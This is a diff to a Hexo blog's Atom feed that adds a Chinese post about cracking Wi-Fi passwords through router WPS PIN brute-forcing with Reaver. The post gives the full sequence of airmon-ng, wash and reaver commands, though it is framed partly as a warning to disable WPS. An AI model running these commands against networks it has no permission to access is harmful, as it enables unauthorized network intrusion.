@@ -5,7 +5,7 @@
   <subtitle><![CDATA[尚多有往来，意美人常在]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://gehaowu.7axu.com//"/>
-  <updated>2015-09-25T17:05:31.859Z</updated>
+  <updated>2015-09-25T18:22:10.056Z</updated>
   <id>http://gehaowu.7axu.com//</id>
   
   <author>
@@ -16,9 +16,41 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[路由 WPS 穷举工具 [Reaver]]]></title>
+    <link href="http://gehaowu.7axu.com/2015/09/reaver-attack-tool/"/>
+    <id>http://gehaowu.7axu.com/2015/09/reaver-attack-tool/</id>
+    <published>2015-09-25T17:57:35.000Z</published>
+    <updated>2015-09-25T18:22:10.056Z</updated>
+    <content type="html"><![CDATA[<h2 id="关闭路由器_WPS_功能，提高路由安全性_WPS(_WiFi_Protected_Setup)，_WiFi保护设置">关闭路由器 WPS 功能，提高路由安全性 <a href="http://www.beamsky.com/wps-wi-fi-protected-setup/" target="_blank" rel="external">WPS( WiFi Protected Setup)， WiFi保护设置</a></h2><p>以下简单示范通过 Reaver 这款路由器 PIN 穷举工具来破解 WIFI 登陆密码。</p>
+<h1 id="给_ArchLinux_安上_Reaver_和_aircrack-ng">给 ArchLinux 安上 Reaver 和 aircrack-ng</h1><p>sudo pacman -S aircrack-ng reaver</p>
+<p>我的电脑 无线网卡名称是 <em>wlp4s0</em></p>
+<h1 id="开启无线网卡混杂模式_（反正我也不懂。。他们说是就是吧。。）">开启无线网卡混杂模式 （反正我也不懂。。他们说是就是吧。。）</h1><p>sudo airmon-ng start wlp4s0</p>
+<h1 id="检测开启_WPS_的路由器">检测开启 WPS 的路由器</h1><p>wash -i wlp4s0mon -C 这个是用来检测周围无线支持PIN的路由</p>
+<h1 id="执行穷举操作">执行穷举操作</h1><p>reaver -i wlp4s0mon -b XX:XX:XX:XX:XX -a -S -w</p>
+<p><img src="/images/2015/09/reaverstart.png" alt="Reaver"><br><img src="/images/2015/09/reaverend.png" alt="Reaver"></p>
+<h1 id="8s/PIN，差不多10来个小时。。。密码就出来了。。。">8s/PIN，差不多10来个小时。。。密码就出来了。。。</h1><p>一般情况下，每个PIN两三秒的样子。。</p>
+<p>也就是开着 WPS 功能很容易被干掉。。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="关闭路由器_WPS_功能，提高路由安全性_WPS(_WiFi_Protected_Setup)，_WiFi保护设置">关闭路由器 WPS 功能，提高路由安全性 <a href="http://www.beamsky.com/wps-wi-fi-protected-]]>
+    </summary>
+    
+      <category term="Linux" scheme="http://gehaowu.7axu.com/tags/Linux/"/>
+    
+      <category term="Reaver" scheme="http://gehaowu.7axu.com/tags/Reaver/"/>
+    
+      <category term="Security" scheme="http://gehaowu.7axu.com/tags/Security/"/>
+    
+      <category term="WPS" scheme="http://gehaowu.7axu.com/tags/WPS/"/>
+    
+      <category term="Security" scheme="http://gehaowu.7axu.com/categories/Security/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[Hello World]]></title>
-    <link href="http://gehaowu.7axu.com/2015/09/26/hello-world/"/>
-    <id>http://gehaowu.7axu.com/2015/09/26/hello-world/</id>
+    <link href="http://gehaowu.7axu.com/2015/09/hello-world/"/>
+    <id>http://gehaowu.7axu.com/2015/09/hello-world/</id>
     <published>2015-09-25T17:05:31.859Z</published>
     <updated>2015-09-25T17:05:31.859Z</updated>
     <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
